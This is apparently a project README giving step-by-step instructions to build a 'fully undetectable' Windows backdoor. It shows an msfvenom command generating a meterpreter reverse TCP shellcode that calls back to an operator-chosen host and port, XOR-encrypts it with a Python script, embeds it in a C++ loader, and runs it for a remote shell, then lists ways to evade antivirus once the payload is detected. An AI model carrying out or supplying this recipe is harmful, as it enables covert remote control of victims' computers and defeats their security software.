# ðŸ”’ Generate **FUD** backdoor with a Python **Crypter** ðŸ”’
Follow the steps bellow to generate a crypted shellcode that can be used on a C++ executable.

## Clone the repository
```
sudo git clone https://github.com/3ct0s/fud-backdoor.git
cd fud-backdoor
```

## Generate The ShellCode

```
msfvenom -p windows/x64/meterpreter_reverse_tcp -e x86/shikata_ga_nai -i 10 LHOST=(IP) LPORT=(PORT) -f raw -o raw.txt
```

## Encode the ShellCode With the XOR Encryption

```
python xor_encryptor.py raw.txt > xor_shellcode.txt
```

## Add a decryption password
Add a password to both the main.cpp file and the xor_encryptor.py. It has to be the same password otherwise it will not work.

- main.cpp:
```cpp
  // replace the key variable with your own password or key
  char key[9] = "password";
  size_t key_len = strlen(key);
```
- xor_encryptor.py:
```python
# key should be similar to the one in the C++ file(main.cpp). Please
# endeavour to change it!!
KEY = "password"
```

## Add the crypted shellcode on main.cpp
Now that you have the encrypted shellcode you need to add it on the main.cpp file just like this:
```cpp
unsigned char xor_shell_code[] = /* place_xor_shellcode_here */;
```

## Compile the main.cpp file
There is no specific way to do this, all you need to do is compile the C++ code into a windows executable. Here are ways to do that.

## Execute the backdoor
Now you can execute the backdoor and enjoy the metepreter shell

## What if it gets detected?

At some point, the anti viruses will be able to detect this backdoor. Here are some things you can do to make it undetectable again. 

You can try to change the payload type protocol and make it http or https and make sure to use another port, add gibberish C++ code on the main.cpp file and you can also try playing with the SSL certificate of the session. Here is an article that covers this: https://www.darkoperator.com/blog/2015/6/14/tip-meterpreter-ssl-certificate-validation

If this still doesn't work, I can't think of another way to make the connection undetectable since this is a meterpreter shell and they get detected quite easily
